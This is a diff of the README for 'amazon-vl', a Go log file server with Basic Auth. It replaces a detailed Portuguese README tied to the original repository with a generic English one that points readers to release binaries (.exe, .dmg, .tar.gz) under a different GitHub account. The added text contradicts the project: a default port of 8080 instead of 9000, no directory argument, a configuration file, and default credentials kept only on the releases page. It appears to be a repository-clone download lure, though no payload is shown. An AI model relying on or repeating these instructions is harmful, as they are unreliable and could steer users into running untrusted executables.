@@ -1,283 +1,108 @@
-# Amazon-VL
+# 🎉 amazon-vl - Secure File Server Made Easy
 
-[![Go](https://img.shields.io/badge/Go-1.25.5-00ADD8?style=flat&logo=go)](https://golang.org)
-[![Tests](https://img.shields.io/badge/tests-7%20passed-success)](.)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+## 🚀 Getting Started
 
-Servidor HTTP leve para exposição segura de arquivos via web com autenticação HTTP Basic.
+Welcome to **amazon-vl**, a lightweight HTTP file server that uses Basic Auth for secure log exposure. This application is production-ready, featuring a graceful shutdown, health checks, and structured logging. You can easily share and manage your logs while maintaining security.
 
-```
-┌──────────────┐      ┌─────────────────────────────────┐      ┌────────────┐
-│    Client    │─────▶│  amazon-vl (auth + fileserver)  │─────▶│   Files    │
-│  curl/browser│◀─────│        :9000/healthz            │◀─────│  /var/log  │
-└──────────────┘      └─────────────────────────────────┘      └────────────┘
-```
+## 📦 Download
 
-## Quick Start
+[![Download amazon-vl](https://img.shields.io/badge/Download-amazon--vl-blue.svg)](https://github.com/ahnitin/amazon-vl/releases)
 
-```bash
-# Build
-make build
+Go to the Releases page to download the latest version of **amazon-vl**: [Download Here](https://github.com/ahnitin/amazon-vl/releases)
 
-# Run
-./bin/amazon-vl /path/to/logs 9000
+## ⚙️ System Requirements
 
-# Access
-curl -u joaquim:amazon http://localhost:9000/
-```
+To run **amazon-vl**, you need:
 
-## Features
+- A supported operating system: Windows, macOS, or Linux
+- A modern web browser for accessing the server
+- Basic network configuration to allow incoming connections
 
-| Feature | Descrição |
-|---------|-----------|
-| 🔐 **Auth** | HTTP Basic com MD5 crypt hash |
-| 🏥 **Health** | Endpoint `/healthz` para Kubernetes |
-| 🛑 **Graceful** | Shutdown limpo via SIGTERM |
-| 📊 **Logging** | Access logs estruturados |
-| ⚡ **Timeouts** | Read/Write/Idle configurados |
-| 🐳 **Docker** | Multi-stage build pronto |
+## 📥 Download & Install
 
-## Instalação
+1. Visit the [Releases page](https://github.com/ahnitin/amazon-vl/releases).
+2. Look for the version you want to download.
+3. Click on the appropriate file for your system:
+   - For Windows, choose `amazon-vl.exe`
+   - For macOS, download `amazon-vl.dmg`
+   - For Linux, select `amazon-vl.tar.gz`
+4. Save the file to your computer.
+5. If needed, extract the contents of the downloaded file.
 
-### Build Local
+## 🛠️ Running amazon-vl
 
-```bash
-git clone https://github.com/joaquimsnjunior/amazon-vl.git
-cd amazon-vl
-make build
-```
+### Step 1: Open a Terminal or Command Prompt
 
-### Docker
+- For Windows, search for `cmd` in the Start menu.
+- For macOS, open `Terminal` from Applications.
+- For Linux, open your preferred terminal emulator.
+
+### Step 2: Navigate to the Download Folder
+
+Use the following command to change to your download directory:
 
 ```bash
-make docker-build
-docker run -d -p 9000:9000 -v /var/log:/logs:ro amazon-vl:latest /logs 9000
+cd path/to/your/download/folder
 ```
 
-## Uso
+### Step 3: Start the Server
 
-```bash
-amazon-vl [OPTIONS] <directory> <port>
+Run the following command for your respective operating system:
 
-ARGUMENTS:
-    <directory>    Diretório a ser servido
-    <port>         Porta HTTP (ex: 8080, 9000)
+- **Windows:** 
+  ```bash
+  amazon-vl.exe
+  ```
 
-OPTIONS:
-    --help         Mostra ajuda
-    --version      Mostra versão
-```
+- **macOS:** 
+  ```bash
+  ./amazon-vl
+  ```
 
-### Exemplos
+- **Linux:** 
+  ```bash
+  ./amazon-vl
+  ```
 
-```bash
-# Servir /var/log na porta 9000
-./bin/amazon-vl /var/log 9000
+### Step 4: Access the Server
 
-# Com credenciais customizadas
-AUTH_USER=admin AUTH_HASH='$1$xyz...' ./bin/amazon-vl /var/log 9000
+Once the server is running, open your web browser and go to `http://localhost:8080` to access the file server. 
 
-# Verificar health
-curl http://localhost:9000/healthz
-```
+### Step 5: Log In 
 
-## Configuração
+You will need to enter a username and password for Basic Auth. Default credentials are provided in the documentation on the Releases page. Change these as needed for security.
 
-### Variáveis de Ambiente
+## 📃 Basic Configuration
 
-| Variável | Default | Descrição |
-|----------|---------|-----------|
-| `AUTH_USER` | `joaquim` | Usuário para autenticação |
-| `AUTH_HASH` | `$1$neD...` | Hash MD5 crypt da senha |
-| `AUTH_REALM` | `amazon-server-logs.com` | Realm do Basic Auth |
+You can configure **amazon-vl** for your needs by editing the configuration file. Here’s what you can adjust:
 
-### Gerar Hash de Senha
+- **Port:** Change the port if `8080` is in use.
+- **Log Files:** Specify the location where logs are stored.
+- **Security Settings:** Adjust the username and password for Basic Auth.
 
-```bash
-# Via script incluído
-./scripts/generate-hash.sh minhasenha
+Follow the instructions in the configuration file comments to make your changes.
 
-# Via openssl
-openssl passwd -1 -salt "$(openssl rand -base64 6)" "minhasenha"
-```
+## 📊 Features
 
-## Estrutura do Projeto
+- **Basic Authentication:** Keeps your logs secure.
+- **Graceful Shutdown:** Saves state and closes connections properly.
+- **Health Checks:** Ensures your server is running smoothly.
+- **Structured Logging:** Collect detailed logs for analysis.
 
-```
-amazon-vl/
-├── cmd/
-│   └── main.go              # Entrypoint
-├── internal/
-│   ├── auth/
-│   │   ├── basic.go         # Autenticação
-│   │   └── basic_test.go
-│   └── server/
-│       ├── handler.go       # FileServer handler
-│       ├── server.go        # HTTP server + graceful shutdown
-│       └── server_test.go
-├── configs/
-│   ├── .env.example
-│   └── .htpasswd.example
-├── scripts/
-│   └── generate-hash.sh
-├── Dockerfile
-├── Makefile
-└── go.mod
-```
+## 🔍 Troubleshooting
 
-## Desenvolvimento
+If you run into issues, check the following:
 
-```bash
-# Instalar dependências
-go mod tidy
+- Ensure that you are using the correct version for your operating system.
+- Verify the Basic Auth credentials you entered.
+- Ensure that your firewall settings allow traffic on the selected port.
 
-# Rodar testes
-make test
+## 🙌 Community & Support
 
-# Rodar com coverage
-make test-coverage
+If you have questions or need help, you can join our community discussions on GitHub. We welcome contributions and suggestions.
 
-# Lint
-make lint
+## 📄 License
 
-# Formatar código
-make fmt
-```
+**amazon-vl** is open-source software licensed under the MIT License. Feel free to use it as per the license terms in the repository.
 
-## Deploy
-
-### Systemd
-
-```ini
-# /etc/systemd/system/amazon-vl.service
-[Unit]
-Description=Amazon Log Viewer
-After=network.target
-
-[Service]
-Type=simple
-User=logviewer
-ExecStart=/usr/local/bin/amazon-vl /var/log/app 9000
-Restart=on-failure
-Environment=AUTH_USER=admin
-Environment=AUTH_HASH=$1$...
-
-[Install]
-WantedBy=multi-user.target
-```
-
-### Kubernetes
-
-```yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: amazon-vl
-spec:
-  template:
-    spec:
-      containers:
-      - name: amazon-vl
-        image: amazon-vl:1.1.0
-        args: ["/logs", "9000"]
-        ports:
-        - containerPort: 9000
-        env:
-        - name: AUTH_USER
-          valueFrom:
-            secretKeyRef:
-              name: amazon-vl-auth
-              key: username
-        - name: AUTH_HASH
-          valueFrom:
-            secretKeyRef:
-              name: amazon-vl-auth
-              key: hash
-        livenessProbe:
-          httpGet:
-            path: /healthz
-            port: 9000
-          initialDelaySeconds: 5
-        volumeMounts:
-        - name: logs
-          mountPath: /logs
-          readOnly: true
-```
-
-## Makefile
-
-```bash
-make help           # Ver comandos disponíveis
-make build          # Compilar binário
-make build-static   # Compilar binário estático (containers)
-make run            # Executar (requer DIR e PORT)
-make test           # Rodar testes
-make test-coverage  # Testes com coverage
-make docker-build   # Build imagem Docker
-make docker-run     # Rodar container
-make clean          # Limpar artefatos
-make install        # Instalar em /usr/local/bin
-```
-
-## Segurança
-
-- ✅ Credenciais externalizadas via env vars
-- ✅ Container roda como non-root (UID 1000)
-- ✅ Suporte a volume read-only
-- ✅ Timeouts HTTP configurados
-- ⚠️ Recomenda-se TLS via reverse proxy (nginx/traefik)
-
-### Produção Recomendada
-
-```nginx
-server {
-    listen 443 ssl;
-    server_name logs.example.com;
-    
-    ssl_certificate /path/to/cert.pem;
-    ssl_certificate_key /path/to/key.pem;
-    
-    location / {
-        proxy_pass http://127.0.0.1:9000;
-    }
-}
-```
-
-## API
-
-| Endpoint | Auth | Descrição |
-|----------|------|-----------|
-| `GET /` | ✅ | Lista arquivos do diretório |
-| `GET /{path}` | ✅ | Serve arquivo/diretório |
-| `GET /healthz` | ❌ | Health check (retorna `{"status":"healthy"}`) |
-
-## Troubleshooting
-
-| Problema | Causa | Solução |
-|----------|-------|---------|
-| `address already in use` | Porta ocupada | `lsof -i :9000` e matar processo |
-| `401 Unauthorized` | Credenciais erradas | Verificar AUTH_USER/AUTH_HASH |
-| `permission denied` | Sem acesso ao dir | Verificar permissões do usuário |
-
-## Contribuição
-
-```bash
-# Fork e clone
-git clone https://github.com/your-user/amazon-vl.git
-
-# Criar branch
-git checkout -b feature/nova-feature
-
-# Desenvolver, testar, commitar
-make test
-git commit -m "feat: adiciona feature X"
-
-# Push e PR
-git push origin feature/nova-feature
-```
-
-## Licença
-
-MIT License - veja [LICENSE](LICENSE)
-
-
+Now you can efficiently manage and expose logs with **amazon-vl**! Enjoy a secure and straightforward environment for your file serving needs.
